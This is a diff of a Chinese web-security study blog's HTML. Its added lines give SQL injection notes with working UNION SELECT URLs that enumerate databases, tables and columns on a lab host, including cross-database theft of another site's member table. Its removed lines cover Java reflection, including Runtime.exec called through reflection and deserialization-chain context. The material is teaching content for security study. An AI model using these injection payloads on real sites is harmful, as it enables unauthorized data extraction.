class="line">Access（单个）</span><br><span class="line">	表名</span><br><span class="line">		列名（字段）</span><br><span class="line">			数据</span><br></pre></td></tr></table></figure>
+<p>目的：获取数据<br>肯定一步步得到信息  </p>
+<p>查询数据库名demo01下的表名信息（借助information_schema.tables存储查询）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;demo01&#x27;</span><br></pre></td></tr></table></figure>
+<p>查询数据库名demo01下的表名admin的列名信息（借助information_schema.columns存储查询）  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;demo01&#x27; and table_name=&#x27;admin&#x27;</span><br></pre></td></tr></table></figure>
+<h2 id="跨库查询："><a href="#跨库查询：" class="headerlink" title="跨库查询："></a>跨库查询：</h2><ul>
+<li><p>1、数据库统一管理（root用户）<br>每个网站的数据库都由root用户统一管理<br>网站A：192.168.1.4:81  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;Z-Blog  数据库root用户  zblog<br>网站B：192.168.1.4:82  D:&#x2F;phpstudy_pro&#x2F;WWW&#x2F;demo01  数据库root用户  demo01  </p>
+</li>
+<li><p>2、跨库注入<br>通过B网站的注入点获取A网站的账号密码</p>
+</li>
+</ul>
+<p>获取mysql下所有数据库名：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(schema_name),5,6 from information_schema.schemata</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(table_name),5,6 from information_schema.tables where table_schema=&#x27;zblog&#x27;</span><br><span class="line"></span><br><span class="line">http://192.168.1.4:82/new.php?id=1 union select 1,2,3,group_concat(column_name),5,6 from information_schema.columns where table_schema=&#x27;zblog&#x27; and table_name=&#x27;zbp_member&#x27;</span><br></pre></td></tr></table></figure>
+<p>解决：单引号过滤绕过方式<br>SQL注入语句中用单引号就不要编码，编码就不用单引号（路径，表名，数据库名等）  </p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+ 
+
+      
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/41WEB%E6%94%BB%E9%98%B2-ASP%E5%BA%94%E7%94%A8/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1062,390 +1453,6 @@
 
  
 
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">34安全开发-JavaEE应用-java反射</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:39:13" itemprop="dateCreated datePublished" datetime="2023-10-18T10:39:13+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:10:47" itemprop="dateModified" datetime="2023-11-06T21:10:47+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>5.6k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>5 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>32、JavaEE-反射机制-开发和安全应用场景</li>
-<li>33、JavaEE-反射机制-类&amp;成员变量&amp;方法&amp;构造方法操作</li>
-<li>34、JavaEE-反射机制-安全应用&amp;反射执行&amp;反序列化链相关</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB2.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB3.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB4.png"></p>
-<h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><ul>
-<li><p>1、什么是Java反射<br>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a><br>Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。<br>该类库包含了Field、Method、Constructor等类。<br>对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制。  </p>
-</li>
-<li><p>2、为什么要用到反射<br>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可）  </p>
-</li>
-<li><p>3、反射机制应用<br>开发应用场景：<br>Spring框架的IOC基于反射创建对象和设置依赖属性。<br>SpringMVC的请求调用对应方法，也是通过反射。<br>JDBC的Class#forName(String className)方法，也是使用反射。  </p>
-</li>
-<li><p>4、安全应用场景：<br>构造利用链，触发命令执行<br>反序列化中的利用链构造<br>动态获取或执行任意类中的属性或方法<br>动态代理的底层原理是反射技术<br>rmi反序列化也涉及到反射操作</p>
-</li>
-</ul>
-<h2 id="Java-反射-Class对象类获取"><a href="#Java-反射-Class对象类获取" class="headerlink" title="Java-反射-Class对象类获取"></a>Java-反射-Class对象类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、根据类名：类名.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">userClass</span> <span class="operator">=</span> User.class;</span><br><span class="line"><span class="comment">//2、根据对象：对象.getClass()</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> user.getClass();</span><br><span class="line"><span class="comment">//3、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span></span><br><span class="line">ClassLoader clsload=ClassLoader.getSystemClassLoader();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass2</span> <span class="operator">=</span> clsload.loadClass(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h2 id="Java-反射-Field成员变量类获取"><a href="#Java-反射-Field成员变量类获取" class="headerlink" title="Java-反射-Field成员变量类获取"></a>Java-反射-Field成员变量类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//获取公共成员变量对象</span></span><br><span class="line">        Field[] fields=aClass.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:fields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取所有成员变量对象</span></span><br><span class="line">        Field[] fields=aClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:fields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取公共，私有单个成员变量对象</span></span><br><span class="line">        Field field=aClass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        Field field=aClass.getDeclaredField(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line"></span><br><span class="line"><span class="comment">//城边变量值获取和赋值</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Field field=aClass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        field.set(u,<span class="number">30</span>);</span><br><span class="line">        Object a=field.get(u);</span><br><span class="line">        System.out.println(a);</span><br></pre></td></tr></table></figure>
-<h2 id="Java-反射-Method成员方法类获取"><a href="#Java-反射-Method成员方法类获取" class="headerlink" title="Java-反射-Method成员方法类获取"></a>Java-反射-Method成员方法类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有公共成员方法对象的数组，包括继承的</span></span><br><span class="line">        Method[] methods = aClass.getMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">            System.out.println(me);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有成员方法对象的数组，不包括继承的</span></span><br><span class="line">        Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line">        <span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">            System.out.println(me);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个公共成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个成员方法对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;UserInfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line">        System.out.println(methods);</span><br><span class="line"></span><br><span class="line"><span class="comment">//运行方法invoke</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">methods</span> <span class="operator">=</span> aClass.getDeclaredMethod(<span class="string">&quot;UserInfo&quot;</span>, String.class, <span class="type">int</span>.class, String.class);</span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="comment">//私有需要开启临时</span></span><br><span class="line">        methods.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods.invoke(u,<span class="string">&quot;xiaodi&quot;</span>,<span class="number">18</span>,<span class="string">&quot;man&quot;</span>);</span><br></pre></td></tr></table></figure>
-
-<h2 id="Java-反射-Constructor构造方法类获取"><a href="#Java-反射-Constructor构造方法类获取" class="headerlink" title="Java-反射-Constructor构造方法类获取"></a>Java-反射-Constructor构造方法类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//返回所有公共构造方法对象的数组</span></span><br><span class="line">        Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con:constructors)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回所有构造方法对象的数组</span></span><br><span class="line">        Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="line">        <span class="keyword">for</span>(Constructor con:constructors)&#123;</span><br><span class="line">            System.out.println(con);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个公共构造方法对象</span></span><br><span class="line">        Constructor con1=aClass.getConstructor();</span><br><span class="line">        Constructor con1=aClass.getConstructor(String.class);</span><br><span class="line">        System.out.println(con1);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回单个构造方法对象</span></span><br><span class="line">        Constructor con2=aClass.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">		Constructor con2=aClass.getDeclaredConstructor(String.class,<span class="type">int</span>.class, String.class);</span><br><span class="line">        System.out.println(con2);</span><br><span class="line"></span><br><span class="line">        Constructor con2=aClass.getDeclaredConstructor(<span class="type">int</span>.class);</span><br><span class="line">        con2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        User uu=(User) con2.newInstance(<span class="string">&quot;xiaodi&quot;</span>,<span class="number">30</span>,<span class="string">&quot;man&quot;</span>);</span><br><span class="line">        System.out.println(uu);</span><br></pre></td></tr></table></figure>
-
-<h2 id="Java-反射-不安全命令执行-反序列化链构造"><a href="#Java-反射-不安全命令执行-反序列化链构造" class="headerlink" title="Java-反射-不安全命令执行&amp;反序列化链构造"></a>Java-反射-不安全命令执行&amp;反序列化链构造</h2><ul>
-<li><p>1、反射实现-命令执行  </p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-原型：</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">-反射：</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method[] methods = aClass.getMethods();</span><br><span class="line"><span class="keyword">for</span> (Method me:methods)&#123;</span><br><span class="line">    System.out.println(me);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">runtime</span> <span class="operator">=</span> getRuntimeMethod.invoke(aClass);</span><br><span class="line">exec.invoke(runtime, <span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line">Class c1= Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">m</span> <span class="operator">=</span> c1.getDeclaredConstructor();</span><br><span class="line">m.setAccessible(<span class="literal">true</span>);</span><br><span class="line">c1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(m.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2、不安全的反射对象<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;指应用程序使用具有反射功能的外部输入来选择要使用的类或代码，<br>可能被攻击者利用而输入或选择不正确的类。绕过身份验证或访问控制检查<br>参考分析：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/165273855">https://zhuanlan.zhihu.com/p/165273855</a><br>利用结合：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7031%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">https://xz.aliyun.com/t/7031（反序列化利用链）</a></p>
-</li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
- 
-
-      
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="z7">
-      <meta itemprop="description" content="师从小迪，欢迎各位来当迪总的韭菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/" class="post-title-link" itemprop="url">33安全开发-JavaEE应用</a>
-        </h2>
-
-        <div class="post-meta">
-	
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-10-18 10:39:04" itemprop="dateCreated datePublished" datetime="2023-10-18T10:39:04+08:00">2023-10-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-11-06 21:10:40" itemprop="dateModified" datetime="2023-11-06T21:10:40+08:00">2023-11-06</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a target="_blank" rel="noopener" href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p>
-<h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul>
-<li>29、JavaEE-JDBC-SQL预编译</li>
-<li>30、JavaEE-HTTP-Filter过滤器</li>
-<li>31、JavaEE-对象域-Listen监听器</li>
-</ul>
-<h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul>
-<li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li>
-<li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li>
-<li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li>
-</ul>
-<p> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter1.png"><br> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter2.png"><br> <img src="/2023/10/18/33%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/filter3.png"></p>
-<h2 id="JavaEE-预编译-SQL"><a href="#JavaEE-预编译-SQL" class="headerlink" title="JavaEE-预编译-SQL"></a>JavaEE-预编译-SQL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">预编译SQL语句并执行,预防SQL注入问题 </span><br><span class="line">String safesql=&quot;select * from news where id=?&quot;; </span><br><span class="line">PreparedStatement preparedStatement=connection.prepareStatement();</span><br><span class="line">preparedStatement.setString(1,s);</span><br><span class="line">ResultSet resultSet=preparedStatement.executeQuery();</span><br></pre></td></tr></table></figure>
-
-<h2 id="JavaEE-过滤器-Filter"><a href="#JavaEE-过滤器-Filter" class="headerlink" title="JavaEE-过滤器-Filter"></a>JavaEE-过滤器-Filter</h2><p>(和安全相关的技术：内存马，权限控制)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Filter被称为过滤器，过滤器实际上就是对Web资源进行拦截，做一些处理后再交给下一个过滤器或Servlet处理，通常都是用来拦截request进行处理的，也可以对返回的 response进行拦截处理。开发人员利用filter技术，可以实现对所有Web资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。  </p>
-<ul>
-<li>1、创建过滤器  </li>
-<li>2、过滤器内置方法<br>init  doFilter destroy  </li>
-<li>3、过滤器触发流程  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(&quot;/xss&quot;)</span></span><br><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;xssFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-class&gt;com.example.filter.xssFilter&lt;/filter-class&gt;</span><br><span class="line">&lt;/filter&gt;</span><br><span class="line">&lt;filter-mapping&gt;</span><br><span class="line">    &lt;filter-name&gt;xssFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/xss&lt;/url-pattern&gt;</span><br><span class="line">&lt;/filter-mapping&gt;</span><br></pre></td></tr></table></figure></li>
-<li>4、过滤器安全场景<br>Payload检测，权限访问控制，红队内存马植入，蓝队清理内存马等<br>内存马参考：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw">https://mp.weixin.qq.com/s/hev4G1FivLtqKjt0VhHKmw</a></li>
-</ul>
